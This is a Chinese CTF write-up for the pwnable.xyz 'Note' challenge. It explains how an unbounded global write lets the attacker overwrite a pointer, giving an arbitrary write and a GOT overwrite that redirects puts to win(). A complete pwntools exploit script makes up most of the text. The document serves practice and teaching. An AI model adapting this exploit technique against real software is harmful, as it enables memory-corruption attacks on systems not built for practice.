pwnable.xyz Note WriteUp

2019年09月12日 238 字 大概 1 分钟 ctf pwn

pwnable.xyz 上的Note的WriteUp。

题目

目标是触发win()函数。注意到，输入1进入的edit_note()函数可对全局变量s进行任意长度写，其中buf和s的距离是0x20，而输入2进入的 edit_desc()函数是从标准输入流写入buf内容所指的地址中，由此可以通过先输入1，将buf中内容覆写，再输入2，达到任意地址写的目的。

还有一点，因为该程序并未开启RELRO保护，因此可以进行GOT表覆写.

EXP

from pwn import *
context.log_level = 'DEBUG'
flag = 0x40093c
elf = ELF('./challenge')
puts_got = elf.got['puts']
print(hex(puts_got))
#puts_got = 0x601220
sh = process('./challenge')
#sh = remote('svc.pwnable.xyz',30016)
sh.recvuntil('> ')
payload = 'A' * 32 + p64(puts_got)
sh.sendline('1')
sh.recvuntil('? ')
sh.sendline('52')
sh.recvuntil('note: ')
sh.sendline(payload)
sh.recvuntil('> ')
sh.sendline('2')
sh.recvuntil('desc: ')
sh.sendline(p64(flag))
sh.recvuntil('> ')
sh.sendline('123')
sh.interactive()
